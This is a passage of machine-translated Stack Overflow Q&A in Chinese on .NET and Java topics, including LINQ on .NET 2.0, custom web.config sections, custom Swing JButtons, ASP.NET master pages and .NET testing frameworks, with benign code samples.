> 
> 赞同：61
> 
> 时间：2008-08-05T12:03:10.927
> 
> 标签：.net, linq, .net-3.5, .net-2.0, clr

启用 LINQ 的应用程序能否在仅安装了 .NET 2.0 运行时的机器上运行？

从理论上讲，LINQ 只不过是语法糖，生成的 IL 代码应该与 .NET 2.0 中的代码相同。

如何在不使用 .NET 3.5 库的情况下编写 LINQ？它会在 .NET 2.0 上运行吗？

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2008-12-27T02:51:12.903

奇怪的是没有人提到[LINQBridge](http://www.albahari.com/nutshell/linqbridge.aspx)。这个很棒的小项目是将 LINQ（IEnumerable，但没有 IQueryable）及其依赖项（Func、Action 等）向后移植到 .NET 2.0。和：

> 如果您的项目在编译期间引用了 LINQBridge，那么它将绑定到 LINQBridge 的查询运算符；如果它在编译期间引用 System.Core，那么它将绑定到 Framework 3.5 的查询运算符。

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2008-08-05T12:07:41.603

有一些“黑客”涉及使用 3.5 框架中的 System.Core.dll 使其与 .net 2.0 一起运行，但我个人不希望使用这种有点不稳定的基础。

请参阅此处：[.NET 2.0 上的 LINQ 支持](http://weblogs.asp.net/fmarguerie/archive/2007/09/05/linq-support-on-net-2-0.aspx)

> 1.  创建一个新的控制台应用程序
> 2.  仅保留 System 和 System.Core 作为引用的程序集
> 3.  将 System.Core 的 Copy Local 设置为 true，因为它在 .NET 2.0 中不存在
> 4.  在 Main 方法中使用 LINQ 查询。比如下面这张。
> 5.  建造
> 6.  将所有 bin 输出复制到仅安装了 .NET 2.0 的机器上
> 7.  跑

（需要 .net 2.0 SP1，我不知道捆绑 System.Core.dll 是否违反 EULA）

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2008-08-05T12:07:46.190

理论上是的，只要您分发 LINQ 特定程序集和任何依赖项。然而，这违反了微软的许可。Scott Hanselman 写了一篇关于[在 ASP.NET 2.0 上部署 ASP.NET MVC](http://www.hanselman.com/blog/DeployingASPNETMVCOnASPNET20.aspx)的博客文章，这与您想要做的类似。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2011-03-04T18:51:25.560

您可以使用来自 mono（.NET for Linux）的 LINQ 源来让 LINQ 在 .NET 2.0 上运行。

```
IEnumerable<T> : yes 
IQueryable<T>  : yes
LINQ to XML : has been working in the trunk, but due to further additions, the trunk doesn't compile anymore 
```

有人在这里做过：
[LINQ for .NET 2.0](http://linq4you.codeplex.com/)

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-05-19T16:19:19.070

简短的回答：

*   **LINQ to Objects：是**（`IEnumerable<T>`）
*   **LINQ to SQL/实体：否**( `IQueryable<T>`)
*   LINQ to XML/DataSets：还没有？

* * *

从 VS2008 定位 .Net 2.0 时，请参阅[有关.Net 3.5 功能自动可用或毫不费力的问题。](https://stackoverflow.com/questions/173080/c-net-3-0-3-5-features-in-2-0-using-visual-studio-2008)

基本上，任何只是“语法糖”和新编译器（C# 3.0、VB 9.0）作为 2.0 兼容的 IL 发出的东西都可以工作。这包括 LINQ 使用的许多功能，例如匿名类、作为匿名委托的 lambda、自动属性、对象初始值设定项和集合初始值设定项。

某些 LINQ 功能使用新的 3.5 程序集（例如 System.Core.dll）中的类、接口、委托和扩展方法。重新分发这些程序集是违反许可证的，但可以重新实现它们。使用扩展方法只需要声明一个空的`System.Runtime.CompilerServices.ExtensionAttribute`. LINQ to Objects 依赖于`IEnumerable<T>`扩展和几个委托声明（the`Action<T>`和`Func<T>`系列），并已在[LINQBridge](http://www.albahari.com/nutshell/linqbridge.aspx)中实现（如[mausch](https://stackoverflow.com/questions/2138/linq-on-the-net-2-0-runtime/394595#394595)所述）。LINQ to XML 和 LINQ to DataSets 依赖于 LINQ to Objects，我想这也可以在 .Net 2.0 中实现，但我还没有看到这样做。

LINQ to SQL 和 LINQ to Entities 需要许多新类（`DataContext`/ `ObjectContext`、许多属性、`EntitySet<T>`、`EntityRef<T>`、`Link<T>`、`IQueryable<T>`等）和表达式树，即使以某种方式重新实现，也可能至少需要 .Net 2.0 SP1 才能工作。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2008-10-10T21:30:37.693

我不确定C#。

但是，我确实知道，只要您使用 VS 2008 编译器以 2.0 框架为目标，您就可以编写没有 3.5 库的 VB LINNQ 代码。

但是，您必须自己实现一些 LINQ 方法。

LINQ 使用语法转换将查询转换为可执行代码。基本上，它将采用如下代码：

```
dim q = from x in xs where x > 2 select x*4; 
```

并将其转换为如下代码：

```
dim q = xs.where(function(x) x > 2).select(function(x) x * 4); 
```

对于 3.5 框架附带的 LINQ 功能，这些方法被实现为 IEnumerable 或 IQueryable 上的扩展方法（还有一堆方法也适用于数据集）。

默认的 IEnumerable 扩展方法在 System.Linq.Enumerable 中定义，如下所示：

```
<Extension()>
public function Select(of T, R)(source as IEnumerable(of T), transform as Func(of T, R)) as IEnumerable(of R)

   'do the transformation...

end function 
```

IQueryable 扩展方法将表达式树作为参数，而不是 lambda。它们看起来像这样：

```
 <Extension()>
 public function Select(of T, R)(source as IQueryable<T>, transform as Expression(of Func(of T, R))
     'build a composite IQueryable that contains the expression tree for the transformation
 end function 
```

表达式树版本使您能够获得提供给子句的表达式的树表示，然后可用于生成 SQL 代码（或您想要的任何其他内容）。

您可能会在大约一天左右的时间内创建自己的 LINQ to 对象版本。这一切都很简单。

如果你想使用 LINQ，那么事情会有点困难。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-08-05T12:07:39.000

不，因为虽然您认为 LINQ 实际上只是语法糖，但它实际上大量使用了表达式树—— .NET 2.0 中没有这个特性。

话虽如此，.NET 3.5 仅建立在 .NET 2.0 之上，这就是 IL 看起来没有“不同”或“特殊”的原因。

我看不出为什么您不应该只安装 .NET 3.5 Framework。.NET 2.0 的一切都可以正常工作，承诺:)

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-08-05T12:14:33.197

据我所知，LINQ 库仅在框架 3.0 之后才可用。如果你想在 framework 2.0 中使用类似的东西，你需要自己重写它:) 或者找一个类似的第三方库。[我在这里](http://weblogs.asp.net/fmarguerie/archive/2007/09/05/linq-support-on-net-2-0.aspx)只找到了一些信息，但它也没有说服我。

# c# - 在没有 Visual Studio 的情况下为 ASP.NET-MVC 进行开发

> ID：2154
> 
> 赞同：31
> 
> 时间：2008-08-05T12:13:40.483
> 
> 标签：c#, asp.net-mvc, visual-studio

我没有在 Visual Studio 中编写我的 ASP.NET C# 应用程序，而是使用了我最喜欢的文本编辑器 UltraEdit32。

有什么方法可以在不使用 VS 的情况下实现 MVC？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-08-05T13:58:52.473

MVC 框架没有特定于 VS 的东西——它只是一堆你可以使用的 DLL。VS 中的向导只是为您构建了一个快速启动框架。

ASP.NET MVC 是“bin-deployable”——在服务器上也没有什么太聪明的设置——只需将通配符 ISAPI 过滤器指向 ASP.NET

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-08-05T12:27:35.230

假设你有正确的程序集和 C# 编译器，理论上你可以使用任何你想编辑的代码，然后手动运行编译器或使用构建脚本。话虽如此，在我看来，在没有 Visual Studio/SharpEdit/Monodevelop 的情况下进行 .NET 开发真的很痛苦。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-28T13:45:26.373

即使您不想在 VS 中实际*编辑*，也可以在那里创建项目并在另一个编辑器中编辑文件。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-06-03T14:50:40.947

对于中小型 mvc 项目， [WebMatrix](http://www.microsoft.com/web/webmatrix/)一点也不差。对于我经常使用 SublimeText 的项目的简单更改。

# asp.net - 如何定义具有潜在子元素和属性的自定义 web.config 部分？

> ID：2155
> 
> 赞同：70
> 
> 时间：2008-08-05T12:13:40.640
> 
> 标签：asp.net

我开发的 Web 应用程序通常需要相互依赖的配置设置，并且当我们在每个环境之间移动时，也有一些设置必须更改。

我们所有的设置目前都是简单的键值对，但创建自定义配置部分会很有用，这样当两个值需要一起更改或需要为环境更改设置时，它会很明显。

创建自定义配置部分的最佳方法是什么？在检索值时是否有任何特殊注意事项？

* * *

## 回答 #1

> 赞同：84
> 
> 时间：2008-08-05T22:17:29.610

**使用属性、子配置部分和约束**

还有可能使用自动处理管道的属性，以及提供轻松添加约束的能力。

我在这里提供一个示例，来自我自己在我的一个站点中使用的代码。有一个限制，我规定了任何一个用户可以使用的最大磁盘空间量。

MailCenterConfiguration.cs：

```
namespace Ani {

    public sealed class MailCenterConfiguration : ConfigurationSection
    {
        [ConfigurationProperty("userDiskSpace", IsRequired = true)]
        [IntegerValidator(MinValue = 0, MaxValue = 1000000)]
        public int UserDiskSpace
        {
            get { return (int)base["userDiskSpace"]; }
            set { base["userDiskSpace"] = value; }
        }
    }
} 
```

这是在 web.config 中设置的，如下所示

```
<configSections>
    <!-- Mailcenter configuration file -->
    <section name="mailCenter" type="Ani.MailCenterConfiguration" requirePermission="false"/>
</configSections>
...
<mailCenter userDiskSpace="25000">
    <mail
     host="my.hostname.com"
     port="366" />
</mailCenter> 
```

**子元素**

子 xml 元素*mail*在与上述相同的 .cs 文件中创建。在这里，我在端口上添加了约束。如果端口分配的值不在此范围内，则运行时将在加载配置时报错。

MailCenterConfiguration.cs：

```
public sealed class MailCenterConfiguration : ConfigurationSection
{
    [ConfigurationProperty("mail", IsRequired=true)]
    public MailElement Mail
    {
        get { return (MailElement)base["mail"]; }
        set { base["mail"] = value; }
    }

    public class MailElement : ConfigurationElement
    {
        [ConfigurationProperty("host", IsRequired = true)]
        public string Host
        {
            get { return (string)base["host"]; }
            set { base["host"] = value; }
        }

        [ConfigurationProperty("port", IsRequired = true)]
        [IntegerValidator(MinValue = 0, MaxValue = 65535)]
        public int Port
        {
            get { return (int)base["port"]; }
            set { base["port"] = value; }
        } 
```

**采用**

然后要在代码中实际使用它，您所要做的就是实例化 MailCenterConfigurationObject，这将**自动**从 web.config 中读取相关部分。

邮件中心配置.cs

```
private static MailCenterConfiguration instance = null;
public static MailCenterConfiguration Instance
{
    get
    {
        if (instance == null)
        {
            instance = (MailCenterConfiguration)WebConfigurationManager.GetSection("mailCenter");
        }

        return instance;
    }
} 
```

另一个文件.cs

```
public void SendMail()
{
    MailCenterConfiguration conf = MailCenterConfiguration.Instance;
    SmtpClient smtpClient = new SmtpClient(conf.Mail.Host, conf.Mail.Port);
} 
```

**检查有效性**

我之前提到过，当加载配置并且某些数据不符合您设置的规则（例如在 MailCenterConfiguration.cs 中）时，运行时会抱怨。当我的网站启动时，我倾向于尽快了解这些事情。解决此问题的一种方法是在 _Global.asax.cx.Application_Start_ 中加载配置，如果配置无效，您将收到异常通知。您的站点不会启动，而是会在[黄屏死机](http://www.codinghorror.com/blog/images/yellow-screen-of-death-large.png)中显示详细的异常信息。

全球.asax.cs

```
protected void Application_ Start(object sender, EventArgs e)
{
    MailCenterConfiguration.Instance;
} 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2008-08-05T12:51:16.430

Quick'n 脏：

首先创建您的**ConfigurationSection**和**ConfigurationElement**类：

```
public class MyStuffSection : ConfigurationSection
{
    ConfigurationProperty _MyStuffElement;

    public MyStuffSection()
    {
        _MyStuffElement = new ConfigurationProperty("MyStuff", typeof(MyStuffElement), null);

        this.Properties.Add(_MyStuffElement);
    }

    public MyStuffElement MyStuff
    {
        get
        {
            return this[_MyStuffElement] as MyStuffElement;
        }
    }
}

public class MyStuffElement : ConfigurationElement
{
    ConfigurationProperty _SomeStuff;

    public MyStuffElement()
    {
        _SomeStuff = new ConfigurationProperty("SomeStuff", typeof(string), "<UNDEFINED>");

        this.Properties.Add(_SomeStuff);
    }

    public string SomeStuff
    {
        get
        {
            return (String)this[_SomeStuff];
        }
    }
} 
```

然后让框架知道如何处理**web.config**中的配置类：

```
<configuration>
  <configSections>
    <section name="MyStuffSection" type="MyWeb.Configuration.MyStuffSection" />
  </configSections>
  ... 
```

实际上在下面添加您自己的部分：

```
 <MyStuffSection>
    <MyStuff SomeStuff="Hey There!" />
  </MyStuffSection> 
```

然后你可以在你的代码中使用它：

```
MyWeb.Configuration.MyStuffSection configSection = ConfigurationManager.GetSection("MyStuffSection") as MyWeb.Configuration.MyStuffSection;

if (configSection != null && configSection.MyStuff != null)
{
    Response.Write(configSection.MyStuff.SomeStuff);
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-09-19T15:39:43.160

[在 MSDN 上](http://msdn.microsoft.com/en-us/library/system.configuration.configurationcollectionattribute.aspx)有一个很好的示例，它使用`ConfigurationCollection`和 .NET 4.5 用于 web.config 中的自定义部分，其中包含配置项列表。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-02-13T13:45:37.817

自定义配置是非常方便的事情，并且通常应用程序最终需要可扩展的解决方案。

对于 .NET 1.1，请参阅文章[http://aspnet.4guysfromrolla.com/articles/020707-1.aspx](http://aspnet.4guysfromrolla.com/articles/020707-1.aspx)

注意：上述解决方案也适用于 .NET 2.0。

.NET 2.0 具体解决方案请参考文章[http://aspnet.4guysfromrolla.com/articles/032807-1.aspx](http://aspnet.4guysfromrolla.com/articles/032807-1.aspx)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-08-05T12:25:20.850

您可以使用部分处理程序来完成此操作。[在http://www.codeproject.com/KB/aspnet/ConfigSections.aspx](http://www.codeproject.com/KB/aspnet/ConfigSections.aspx)有一个关于如何编写的基本概述，但是它指的是 app.config，这与编写一个用于 web 的几乎相同。配置。这将允许您在配置文件中拥有自己的 XML 树并进行一些更高级的配置。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-02-04T17:59:32.160

我发现最简单的方法是使用[appSettings section](https://msdn.microsoft.com/en-us/library/system.configuration.configurationmanager.appsettings%28v=vs.110%29.aspx?f=255&MSPPError=-2147217396)。

1.  将以下内容添加到 Web.config：

    ```
    <appSettings>
        <add key="MyProp" value="MyVal"/>
    </appSettings> 
    ```

2.  从您的代码访问

    ```
    NameValueCollection appSettings = ConfigurationManager.AppSettings;
    string myPropVal = appSettings["MyProp"]; 
    ```

# java - 在 Java 中创建自定义 JButton

> ID：2158
> 
> 赞同：102
> 
> 时间：2008-08-05T12:15:08.283
> 
> 标签：java, swing, jbutton

有没有办法`JButton`用你自己的按钮图形创建一个，而不仅仅是按钮内的图像？

`JButton`如果没有，是否有另一种方法可以在 java中创建自定义？

* * *

## 回答 #1

> 赞同：96
> 
> 时间：2008-08-05T13:03:43.707

当我第一次学习 Java 时，我们必须制作 Yahtzee，我认为创建自定义 Swing 组件和容器而不只是在一个`JPanel`. 当然，扩展组件的好处`Swing`是能够添加对键盘快捷键和其他辅助功能的支持，而这些功能仅通过`paint()`方法打印一张漂亮的图片是无法做到的。然而，它可能不是最好的方法，但它可能是你的一个很好的起点。

编辑 8/6 - 如果从图像中看不出来，每个骰子都是一个可以单击的按钮。这会将其移至`DiceContainer`下方。查看源代码，您可以看到每个 Die 按钮都是根据其值动态绘制的。

![替代文字](../Images/a36eb4c3e486a9be80b2fed1bf35264e.png)
![替代文字](../Images/617e2721b631b0345cf64f0a364a63b3.png)
![替代文字](../Images/b55ad5769e07637867d4875fee6deb05.png)

以下是基本步骤：

1.  创建一个扩展类`JComponent`
2.  `super()`在构造函数中调用父构造函数
3.  确保你的类实现`MouseListener`
4.  把它放在构造函数中：

    ```
    enableInputMethods(true);   
    addMouseListener(this); 
    ```

5.  覆盖这些方法：

    ```
    public Dimension getPreferredSize()  
    public Dimension getMinimumSize()  
    public Dimension getMaximumSize() 
    ```

6.  覆盖此方法：

    ```
    public void paintComponent(Graphics g) 
    ```

绘制按钮时必须使用的空间量由`getPreferredSize()`, 假设`getMinimumSize()`并`getMaximumSize()`返回相同的值定义。我没有对此进行太多实验，但是根据您用于 GUI 的布局，您的按钮可能看起来完全不同。

最后，[源代码](https://github.com/kdeloach/labs/blob/master/java/yahtzee/src/Dice.java)。以防我错过了什么。

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2008-08-05T12:53:35.990

是的，这是可能的。使用 Swing 的主要优点之一是可以轻松创建和操作抽象控件。

这是扩展现有 JButton 类以在文本右侧绘制一个圆圈的快速而肮脏的方法。

```
package test;

import java.awt.Color;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Graphics;

import javax.swing.JButton;
import javax.swing.JFrame;

public class MyButton extends JButton {

    private static final long serialVersionUID = 1L;

    private Color circleColor = Color.BLACK;

    public MyButton(String label) {
        super(label);
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);

        Dimension originalSize = super.getPreferredSize();
        int gap = (int) (originalSize.height * 0.2);
        int x = originalSize.width + gap;
        int y = gap;
        int diameter = originalSize.height - (gap * 2);

        g.setColor(circleColor);
        g.fillOval(x, y, diameter, diameter);
    }

    @Override
    public Dimension getPreferredSize() {
        Dimension size = super.getPreferredSize();
        size.width += size.height;
        return size;
    }

    /*Test the button*/
    public static void main(String[] args) {
        MyButton button = new MyButton("Hello, World!");

        JFrame frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(400, 400);

        Container contentPane = frame.getContentPane();
        contentPane.setLayout(new FlowLayout());
        contentPane.add(button);

        frame.setVisible(true);
    }

} 
```

请注意，通过覆盖**paintComponent**可以更改按钮的内容，但边框是由**paintBorder**方法绘制的。还需要管理**getPreferredSize**方法以动态支持对内容的更改。测量字体指标和图像尺寸时需要小心。

对于创建可以依赖的控件，上述代码不是正确的方法。Swing 中的尺​​寸和颜色是动态的，并且取决于所使用的外观和感觉。甚至默认的*Metal*外观在 JRE 版本中也发生了变化。最好实现**AbstractButton**并符合 Swing API 制定的准则。一个好的起点是查看**javax.swing.LookAndFeel**和**javax.swing.UIManager**类。

[http://docs.oracle.com/javase/8/docs/api/javax/swing/LookAndFeel.html](http://docs.oracle.com/javase/8/docs/api/javax/swing/LookAndFeel.html)

[http://docs.oracle.com/javase/8/docs/api/javax/swing/UIManager.html](http://docs.oracle.com/javase/8/docs/api/javax/swing/UIManager.html)

了解 LookAndFeel 的结构对于编写控件很有用： [创建自定义外观](http://wayback.archive.org/web/20090309070901/http://java.sun.com/products/jfc/tsc/articles/sce/index.html)

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2008-08-05T12:47:17.967

您可以随时尝试 Synth 的外观和感觉。您提供一个 xml 文件作为一种样式表，以及您想要使用的任何图像。代码可能如下所示：

```
try {
    SynthLookAndFeel synth = new SynthLookAndFeel();
    Class aClass = MainFrame.class;
    InputStream stream = aClass.getResourceAsStream("\\default.xml");

    if (stream == null) {
        System.err.println("Missing configuration file");
        System.exit(-1);                
    }

    synth.load(stream, aClass);

    UIManager.setLookAndFeel(synth);
} catch (ParseException pe) {
    System.err.println("Bad configuration file");
    pe.printStackTrace();
    System.exit(-2);
} catch (UnsupportedLookAndFeelException ulfe) {
    System.err.println("Old JRE in use. Get a new one");
    System.exit(-3);
} 
```

从那里开始，像往常一样添加您的 JButton。唯一的变化是您使用 setName(string) 方法来确定按钮应映射到 xml 文件中的内容。

xml 文件可能如下所示：

```
<synth>
    <style id="button">
        <font name="DIALOG" size="12" style="BOLD"/>
        <state value="MOUSE_OVER">
            <imagePainter method="buttonBackground" path="dirt.png" sourceInsets="2 2 2 2"/>
            <insets top="2" botton="2" right="2" left="2"/>
        </state>
        <state value="ENABLED">
            <imagePainter method="buttonBackground" path="dirt.png" sourceInsets="2 2 2 2"/>
            <insets top="2" botton="2" right="2" left="2"/>
        </state>
    </style>
    <bind style="button" type="name" key="dirt"/>
</synth> 
```

那里的 bind 元素指定要映射到的内容（在本例中，它将将该样式应用于 name 属性已设置为“dirt”的任何按钮）。

还有几个有用的链接：

[http://javadesktop.org/articles/synth/](http://javadesktop.org/articles/synth/)

[http://docs.oracle.com/javase/tutorial/uiswing/lookandfeel/synth.html](http://docs.oracle.com/javase/tutorial/uiswing/lookandfeel/synth.html)

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2008-08-20T15:48:56.063

我可能会在错误的方向行驶一百万英里（但我还很年轻：P）。但是您不能将图形添加到面板，然后将鼠标侦听器添加到图形对象，以便当用户在图形上执行您的操作时。

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2008-08-05T12:30:34.757

自从我早期的 CS 课程以来，我没有做过 SWING 开发，但如果它不是内置的，你可以继承`javax.swing.AbstractButton`并创建你自己的。将某些东西与他们现有的框架连接起来应该非常简单。

# asp.net - AJAX WebControls 的简单方法

> ID：2196
> 
> 赞同：20
> 
> 时间：2008-08-05T12:40:30.680
> 
> 标签：asp.net, ajax, web-controls

我有一个正在尝试优化的 Web 应用程序。一些控件隐藏在 dialog-style`DIVs`中。所以，我想让它们仅在用户想要查看它们时通过 AJAX 加载。这对于大多数基于文字的控件（各种菜单和小部件）来说很好，但是当我有我所谓的“脏”控件时——那些将大量信息写入`ViewState`、在页面上放置大量 CSS 或脚本的控件，需要很多引用等 - 这些似乎不可能“移出页面”，特别是考虑到 ASP.NET 将如何对回发做出反应。

我正在考虑某种步骤，我覆盖 Render，找到我想要移出的位的标记并将 AJAX 占位符放在那里，但不仅服务器开销看起来很极端，而且感觉就像一个完整的 hack。此外，这里的关键元素是包含带有验证控件的表单的对话框，我无法想象如何移动控件*及其*所需的脚本。

**在我狂热的想象中，我想这样做：**

```
AJAXifier.AJAXify(ctlEditForm); 
```

可悲的是，我知道这是一场梦。

在不给服务器造成过多负载的情况下，我能真正接近快速简单的 AJAXification 吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-08-05T14:19:26.860

查看 Telerik 的[RadAjax](http://www.telerik.com/products/aspnet-ajax/controls/ajax/overview.aspx)控件 - 它允许您避免使用 UpdatePanel，并通过声明调用控件之间的直接关系以及调用控件时应该“Ajaxified”的控件来限制服务器和客户端之间来回传递的信息量提交回发。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-05T15:54:18.620

我建议你这个周末去当地的书店，喝杯咖啡，看看 Manning Press 的 jQuery in Action。继续阅读商店中这本 300 页的书的第一章，如果它引起您的共鸣，请购买。

我认为您会惊讶于 jQuery 让您执行您在此处描述的内容的简单程度。从后台对服务器的 ajax 调用，到根据访问者的操作显示和隐藏 div 标签。您必须编写的代码量非常少。

有很多优秀的 JavaScript 库，这只是我喜欢的其中一个，而且它真的很容易上手。首先使用标签包含对当前 jQuery 文件的引用，然后编写几行代码来与您的页面进行交互。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-08-05T14:19:01.700

第一步是让你的“脏”块独立的用户控件

第二步是将这些控件嵌入到您的消费页面上

第三步是将每个用户控件标签包装在自己的 Asp:UpdatePanel 中

第四步是确保您的控件通过读取属性来获取所需的数据，这些属性检查视图状态是否存在预先存在的值。我知道这会使您的代码依赖于丑陋的全局变量，但这是完成此任务的快速方法。

你的旅费可能会改变。

# c# - 如何从内容页面后面的代码更改母版页的背景？

> ID：2209
> 
> 赞同：24
> 
> 时间：2008-08-05T12:46:45.003
> 
> 标签：c#, asp.net, .net, master-pages

我特别想从使用该母版页的内容页的代码 (C#) 中将样式添加`background-color`到母版页的标记中。`<body>`

我有不同的内容页面，需要根据加载的内容页面使母版页具有不同的颜色，以便母版页与内容页的主题相匹配。

我在下面有一个解决方案：

* * *

我正在寻找更多类似的东西：

```
Master.Attributes.Add("style", "background-color: 2e6095"); 
```

内容页面的页面加载功能内部。但我无法让上述线路正常工作。我只需要更改页面`background-color`的`<body>`标签。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-08-05T12:56:54.220

对于特定情况，我会做的是：

一世。将主体定义为服务器端控件

```
<body runat="server" id="masterpageBody"> 
```

ii. 在您的内容 aspx 页面中，使用寄存器注册 MasterPage：

```
<% MasterPageFile="..." %> 
```

iii. 在内容页面中，您现在可以简单地使用

```
Master.FindControl("masterpageBody") 
```

并有权访问控件。现在，您可以更改您喜欢的任何属性/样式！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-08-05T13:28:01.613

这就是我想出的：

在页面加载函数中：

```
HtmlGenericControl body = (HtmlGenericControl)Master.FindControl("default_body");
body.Style.Add(HtmlTextWriterStyle.BackgroundColor, "#2E6095"); 
```

在哪里

> default_body = body 标签的 id。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-05T12:49:29.117

我相信您在谈论内容管理系统。我过去处理这种情况的方法是：

1.  允许页面/内容定义额外的自定义样式表或
2.  允许页面/内容定义内联样式标签

# c# - 在 .NET 2.0 中实现 BDD/TDD 的最佳方式是什么？

> ID：2214
> 
> 赞同：26
> 
> 时间：2008-08-05T12:50:15.543
> 
> 标签：c#, .net, testing, tdd, bdd

我希望在我的应用程序中添加一个测试套件，但是我无法迁移到 .NET 3.5 的更新测试框架。

有人对使用好的测试框架有什么建议吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-08-06T14:16:35.790

我们使用[MbUnit](http://www.mbunit.com/)和[Rihno Mocks](http://www.ayende.com/Blog/archive/2007/03/28/Rhino-Mocks-3.0-Released.aspx)，它们被证明可以很好地协同工作。在进行 TDD 时，您几乎肯定需要进行某种形式的依赖注入，虽然这可以手动完成，但值得一看 IoC 容器，例如[Castle Windsor](http://www.castleproject.org/projects/windsor/)。

非常值得看一下 John Paul Bodhood 的屏幕截图以帮助您入门。[JPB 的博客](http://www.jpboodhoo.com/)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2008-09-12T10:02:36.487

NUnit 和 Rhino 非常适合，[自动模拟容器](http://www.ayende.com/Blog/archive/2007/06/08/The-Auto-Mocking-Container.aspx)可能会很有趣。

如果您也在寻找 BDD，那么[NBehave](http://nbehave.org/)可能是一个不错的选择。但是，如果您只是指与单元测试（xSpec）相关的 BDD 风格，尽管您可以通过添加框架（尽管[specunit](http://code.google.com/p/specunit-net/)之类的东西确实添加了一些语法糖），但您可能想看看[MSpec](http://codebetter.com/blogs/aaron.jensen/archive/2008/05/08/introducing-machine-specifications-or-mspec-for-short.aspx)也很有趣。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-06-17T12:27:08.960

查看 Rob Conery 在 BDD 上使用 MSpec 的截屏视频。非常令人印象深刻[http://blog.wekeroad.com/mvc-storefront/kona-3/](http://blog.wekeroad.com/mvc-storefront/kona-3/)

编辑：我现在使用这种方法：http: [//10printhello.com/the-one-bdd-framework-to-rule-them/](http://10printhello.com/the-one-bdd-framework-to-rule-them/)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-08-05T12:54:20.620

对于 Mock Object 库，我发现 BSD 许可的[Rhino.Mocks](http://ayende.com/projects/rhino-mocks.aspx)相当令人愉悦。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-08-06T14:06:19.540

我在使用[NUnit](http://www.nunit.org)方面也取得了巨大的成功。

当需要模拟对象时，我也使用过[NMock 。](http://www.nmock.org)作为额外的奖励，用于创建模拟对象的工厂称为 Mockery。

为了便于单元测试的运行，我在编写代码时使用了[TestDriven.NET](http://testdriven.net)来运行单元测试。此外，我使用[Cruise Control .NET](http://ccnet.thoughtworks.com)来观察 SVN 并检查每个新提交是否构建并通过所有单元测试。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-10-10T18:06:47.480

这可能是对已经说过的内容的总结，但对于 TDD，我个人使用 Rhino Mocks 和 MBUnit。Rhino Mocks 是一个免费和开源的模拟框架。Rhino Mocks 的优点是我们不需要像在 NMock 中那样使用魔术字符串来设置您的期望。

我喜欢 MBUnit，因为 MbUnit 具有 RowTests 的概念，它允许您改变对测试方法的输入。MBUnit 也是免费提供的。

您还希望确保您为单元测试框架选择的任何内容都得到 CI（持续集成服务器）的支持。Cruise Control.NET 默认支持 Nunit，您必须做一些额外的工作才能让 MBUnit 在 ccnet 中工作。

从 IDE 的角度来看，您必须拥有 TestDriven.NET。TestDriven.NET 允许您在 IDE 中右键单击并运行测试，它支持 MBUnit 和 Nunit 等。

NBehave 是我用过的 BDD 库。我没有使用过其他任何产品，因此无法与您进行比较和对比，但是 MBUnit 团队的 Gallio 支持 NBehave，这意味着您可以像使用 TestDriven.NET 进行单元测试一样运行 BDD 测试。

我也强烈推荐 Resharper。您会发现使用此重构和指导工具可显着提高您的工作效率。它将帮助您在开发测试时更改代码。

希望这可以帮助

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-08-05T13:03:45.080

**NUnit**可在[http://www.nunit.org](http://www.nunit.org)获得， 即使在 MS 堆栈上工作时，我也建议这样做 - MVC 预览中正在发生对非 MS 框架的支持，这显示了朝着正确方向的明确运动，以允许我们一切都是为了定制我们的堆栈以适应。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-09-07T12:58:49.990

将 nUnit 与 TFS 一起使用并不难。甚至在 codeplex 上还有一个项目可以实现这一点：[NUnit for Team Build](http://www.codeplex.com/nunit4teambuild)，它甚至可以将结果“发布”到仓库。

我还没有尝试过 - 但我会建议在 nUnit 中有大量投资（或对它有强烈偏好而不是 MSTest 工具）的客户，他们有兴趣实施 TFS 以继续使用 nUnit，而不是尝试转换他们的所有现有的测试。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-09-27T04:28:28.860

[我必须为起订](http://code.google.com/p/moq/ "这是项目网站，请查看")量大喊大叫。它是一个简洁的轻量级模拟框架，可引导您进入成功的深渊。

TFS 内置的测试工具是可以的。他们会完成工作，但通常会有点麻烦。生成的报告、代码覆盖率和其他一些部分特别糟糕。它们会让你在 22 岁而不是 50 岁时秃顶。

如果您真的喜欢测试，请考虑尝试一些持续集成。你会很快感受到回归带来的痛苦，而这种痛苦可能会帮助你更快地达到最终目标。

不管你做什么，如果你有时间，尝试一些，看看哪一个是最自然的。祝你好运，编码愉快。

* * *

## 回答 #10

> 赞同：2
> 
